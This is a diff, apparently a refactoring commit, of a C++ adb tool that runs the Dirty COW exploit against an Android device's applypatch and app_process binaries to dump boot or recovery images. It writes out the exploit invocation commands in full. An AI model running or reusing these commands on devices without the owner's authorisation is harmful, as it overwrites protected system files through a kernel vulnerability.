@@ -19,13 +19,13 @@ using namespace std;
 
 typedef unsigned char byte;
 
-static string appDirectory;
-static string arch;
+static string app_dir;
+static string arch_type;
 static FILE *fsout;
-static bool startwrite = false;
-static int ncrash = 0;
-static int nBlock = 0;
-static long currentSize = 0;
+static bool start_write = false;
+static int crash_number = 0;
+static int block_number = 0;
+static long current_size = 0;
 
 /* Shorter regex is possible, but I prefer like that */
 
@@ -44,9 +44,10 @@ static regex radbe("^error:(.+)\\s+");
  * Run command
  * Return 0 if success, else -1 if error
  */
-int runcmd(string cmd) {
+int cmd_run(string cmd) {
     char rslt[256];
-    int cmdv = 0;
+    int ret = 0;
+
     FILE *fc = popen(cmd.c_str(), "r");
 
     /* Redirect stderr to stdout */
@@ -58,9 +59,10 @@ int runcmd(string cmd) {
         while (fgets(rslt, sizeof rslt, fc) != NULL) {
             if (regex_match(string(rslt), rcmdline))
                 cout << regex_replace(string(rslt), rcmdline, "$1") << endl;
+
             /* If error matched, return -1 */
             if (regex_match(rslt, radbe)) {
-                cmdv = -1;
+                ret = -1;
                 break;
             }
         }
@@ -70,7 +72,8 @@ int runcmd(string cmd) {
         cerr << "Error running '" << string(cmd) << "'" << endl;
         return -1;
     }
-    return cmdv;
+
+    return ret;
 }
 
 /*
@@ -97,6 +100,7 @@ void split(const string &s, char delim, vector<string> &elems) {
 vector<string> split(const string &s, char delim) {
     vector<string> elems;
     split(s, delim, elems);
+
     return elems;
 }
 
@@ -140,25 +144,35 @@ void string_to_bytearray(std::string str, unsigned char *&array, int &size) {
  * Detect if "/system/bin/app_process64" is on device
  * If found return <ANDROID_64> else <ANDROID_32>
  */
-string getArchType() {
-    char arch_number[8];
-    FILE *get_arch;
-    string val;
+int arch_type_get() {
+    int ret = 0;
+    char arch_version[8];
+    FILE *arch_popen;
 
-    get_arch = popen(
-        "adb shell 'if [ -s /system/bin/app_process64 ]; then echo 64; fi;'",
-        "r");
-    fgets(arch_number, sizeof(arch_number), get_arch);
-    pclose(get_arch);
+    arch_popen =
+        popen("adb shell 'if [ -s /system/bin/app_process64 ]; then echo 64; "
+              "elif [ -s /system/bin/app_process32 ]; then echo 32; fi;'",
+              "r");
+    fgets(arch_version, sizeof(arch_version), arch_popen);
+    pclose(arch_popen);
 
-    if (strstr(arch_number, "64")) {
+    if (strstr(arch_version, "64")) {
         cout << "* Android x64 version detected." << endl;
-        val = string(ANDROID_64);
-    } else {
+        arch_type = string(ANDROID_64);
+    } else if (strstr(arch_version, "32")) {
         cout << "* Android x32 version detected." << endl;
-        val = string(ANDROID_32);
+        arch_type = string(ANDROID_32);
+    } else {
+        cout << "* Android x32 version detected but not supported (4.4.x or "
+                "lower), exiting..."
+             << endl;
+        ret = -1;
     }
-    return val;
+
+    // TEMP
+    system("pause");
+
+    return ret;
 }
 
 /*
@@ -214,12 +228,11 @@ int init() {
 
     /* Push files to the device */
     for (auto s : files) {
-        sprintf(cmd, "adb push %s%sbin%s%s /data/local/tmp",
-                appDirectory.c_str(), DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR,
-                s.c_str());
+        sprintf(cmd, "adb push %s%sbin%s%s /data/local/tmp", app_dir.c_str(),
+                DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR, s.c_str());
         cout << string(cmd) << endl;
 
-        if (runcmd(cmd) != 0)
+        if (cmd_run(cmd) != 0)
             return -1;
     }
 
@@ -227,12 +240,12 @@ int init() {
     for (auto s : cmdlist) {
         cout << string(s) << endl;
 
-        if (runcmd(s) != 0)
+        if (cmd_run(s) != 0)
             return -1;
     }
 
-    arch = getArchType();
-    if (arch.empty())
+    /* Get arch type */
+    if (arch_type_get() != 0)
         return -1;
 
     return 0;
@@ -241,7 +254,7 @@ int init() {
 /*
  * Apply exploit to applypatch (for boot or process) and app_process*
  */
-int runExploit(int v) {
+int exploit_run(int partition) {
     cout << "**********************\n"
             "**** Run Exploit *****\n"
             "**********************\n"
@@ -252,30 +265,32 @@ int runExploit(int v) {
         ""  /* For app_process */
     };
 
-    if (v == BOOT)
+    if (partition == BOOT)
         cmdlist[0].append(
             "adb shell /data/local/tmp/dirtycow /system/bin/applypatch "
             "/data/local/tmp/recowvery-applypatch_boot");
-    else if (v == RECOVERY)
+    else if (partition == RECOVERY)
         cmdlist[0].append(
             "adb shell /data/local/tmp/dirtycow /system/bin/applypatch "
             "/data/local/tmp/recowvery-applypatch_recovery");
     else
         return -1;
 
-    if (arch == ANDROID_64)
+    if (arch_type == ANDROID_64)
         cmdlist[1] =
             "adb shell /data/local/tmp/dirtycow /system/bin/app_process64 "
             "/data/local/tmp/recowvery-app_process64";
-    else
+    else if (arch_type == ANDROID_32)
         cmdlist[1] =
             "adb shell /data/local/tmp/dirtycow /system/bin/app_process32 "
             "/data/local/tmp/recowvery-app_process32";
+    else
+        return -1;
 
     for (auto s : cmdlist) {
         cout << s << endl;
 
-        if (runcmd(s) != 0)
+        if (cmd_run(s) != 0)
             return -1;
     }
 
@@ -285,12 +300,13 @@ int runExploit(int v) {
 /*
  * Reboot device from adb
  */
-int rebootDevice() {
+int device_reboot() {
     cout << "************************\n"
             "**** Reboot Device *****\n"
             "************************\n"
          << endl;
-    return runcmd(string("adb reboot"));
+
+    return cmd_run(string("adb reboot"));
 }
 
 /*
@@ -305,7 +321,7 @@ int rebootDevice() {
  * <*** DUMP END ***>: Dumping is end / end of process.
  * <Other lines>: Displayed
  */
-int displayLogAndConvertData(string line) {
+int logcat_convert_to_data(string line) {
     /*
      * If an unexpected EOF from recowvery-applypatch or if no <pipe>...
      * We can't receive a null string, so break the loop, close fsout, and exit
@@ -319,10 +335,10 @@ int displayLogAndConvertData(string line) {
 
     /*
      * <*** DUMP START ***>
-     * set startwrite = true to write parsed data to fsout
+     * set start_write = true to write parsed data to fsout
      */
     if (regex_match(line, rs)) {
-        startwrite = true;
+        start_write = true;
         cout << "Start writing to file..." << endl;
     }
 
@@ -332,7 +348,7 @@ int displayLogAndConvertData(string line) {
      *   It's possible to have matched string before intercept DUMP START,
      *   If we convert now, it's a good idea to have a broken output file.
      */
-    if (startwrite && regex_match(line, rl)) {
+    if (start_write && regex_match(line, rl)) {
         string s = regex_replace(line, rl, "$1");
         vector<string> data = split(s, ',');
         for (int c = 0; c < (int)data.size(); c++) {
@@ -348,13 +364,14 @@ int displayLogAndConvertData(string line) {
                 cout << string(" - Message      : ") << ex.what() << endl;
             }
         }
-        nBlock++;
-        currentSize = nBlock * 32;
+        block_number++;
+        current_size = block_number * 32;
 
         cout << "\r";
-        cout << "Block read: " << nBlock << " (Size: " << currentSize << ")";
+        cout << "Block read: " << block_number << " (Size: " << current_size
+             << ")";
     } else if (!regex_match(line, rl) &&
-               (!regex_match(line, rf) && !startwrite) && line.length() > 1) {
+               (!regex_match(line, rf) && !start_write) && line.length() > 1) {
         /*
          * Display the other lines (for debuging, logging...)
          */
@@ -365,9 +382,9 @@ int displayLogAndConvertData(string line) {
      * <*** DUMP END ***>
      * Flush and close fsout, inform the user, and break the loop.
      */
-    if (startwrite && regex_match(line, rf)) {
+    if (start_write && regex_match(line, rf)) {
         cout << endl << "Finish" << endl;
-        startwrite = false;
+        start_write = false;
         return 1;
     }
 
@@ -380,8 +397,8 @@ int displayLogAndConvertData(string line) {
     if (regex_match(line, re)) {
         cout << std::string("* Error received from ADB *") << std::endl;
 
-        startwrite = false;
-        if (ncrash == 3) {
+        start_write = false;
+        if (crash_number == 3) {
             cout << std::string("* Too many tries, please check your < "
                                 "recowvery-applypatch.c > and try again.")
                  << std::endl;
@@ -391,52 +408,57 @@ int displayLogAndConvertData(string line) {
                     "* Be patient, recowvery-applypatch will restart in a few "
                     "minutes.")
              << std::endl;
-        ncrash++;
+        crash_number++;
     }
+
     return 0;
 }
 
 /*
  * Run <adb logcat -s recowvery> and send line by line to
- * <displayLogAndConvertData> function
+ * <logcat_convert_to_data> function
  */
-int readFromLogcat() {
+int logcat_read() {
+    char buff[1024];
+    int ret = 0;
+
     cout << "*********************************\n"
             "**** adb logcat -s recowvery ****\n"
             "*********************************\n"
          << endl;
 
-    char buff[1024];
-    int prc = 0;
     FILE *fc = popen("adb logcat -s recowvery", "r");
     if (fc) {
         while (fgets(buff, sizeof buff, fc) != NULL) {
-            prc = displayLogAndConvertData(string(buff));
+            ret = logcat_convert_to_data(string(buff));
             /* Error occuring */
-            if (prc == -1) {
+            if (ret == -1) {
                 cerr << "Error during the process !" << endl;
                 break;
             }
             /* Process finished */
-            if (prc == 1)
+            if (ret == 1)
                 break;
         }
+
         /*
-         * When finish or an error received from adb, <startwrite> is set to
+         * When finish or an error received from adb, <start_write> is set to
          * false.
          * If set to true, a NULL string has been received before receiving a
          * DUMP_END or DUMP_ERROR.
          * So, so we display an error.
          */
-        if (startwrite) {
+        if (start_write) {
             cerr << "Error during the process !" << endl;
-            prc = errno;
+            ret = errno;
         }
         fclose(fc);
     } else {
         cerr << "Error running <adb logcat -s recowvery" << endl;
+        ret = -1;
     }
-    return prc;
+
+    return ret;
 }
 
 /* main */
@@ -446,56 +468,58 @@ int main(int argc, char **argv) {
 
     if (argc == 1) {
         help();
-        return ret;
+        return 0;
     }
 
     /* Fix for windows
      * If run in same directory as the exe, return only the exe name without
      * folder where it run.
-     * So, if DIRECTORY_SEPARATOR not found in argv_str, appDirectory = "." for
+     * So, if DIRECTORY_SEPARATOR not found in argv_str, app_dir = "." for
      * linux, mac and windows
      */
     string argv_str(argv[0]);
     if (argv_str.find_last_of(DIRECTORY_SEPARATOR) != string::npos)
-        appDirectory =
+        app_dir =
             argv_str.substr(0, argv_str.find_last_of(DIRECTORY_SEPARATOR));
     else
-        appDirectory = string(".");
+        app_dir = string(".");
 
-    ret = init();
+    /* Run init */
+    if (init() != 0)
+        return -1;
 
-    if (ret != 0)
-        return ret;
-
+    /* Get user choice and run exploit*/
     if (string(argv[1]) == "boot") {
-        ret = runExploit(BOOT);
+        ret = exploit_run(BOOT);
         filename = "boot.img";
     } else {
-        ret = runExploit(RECOVERY);
+        ret = exploit_run(RECOVERY);
         filename = "recovery.img";
     }
 
     if (ret != 0)
         return ret;
-    else {
-        fsout = fopen(filename.c_str(), "wb");
-        if (!fsout) {
-            cerr << "Can't open or create file: <" << string(filename) << ">"
-                 << endl;
-            rebootDevice();
-            return errno;
-        } else {
-            ret = readFromLogcat();
-            fclose(fsout);
-        }
+
+    fsout = fopen(filename.c_str(), "wb");
+    if (!fsout) {
+        cerr << "Can't open or create file: <" << string(filename) << ">"
+             << endl;
+        device_reboot();
+
+        return errno;
+    } else {
+        ret = logcat_read();
+        fclose(fsout);
+
         cout << "\n"
                 "Image file saved here: "
-             << appDirectory << string(DIRECTORY_SEPARATOR) << string(filename)
+             << app_dir << string(DIRECTORY_SEPARATOR) << string(filename)
              << endl;
     }
 
+    /* End of process, restart the device */
     cout << "Rebooting your device..." << endl;
-    ret = rebootDevice();
+    device_reboot();
 
-    return ret;
+    return 0;
 }
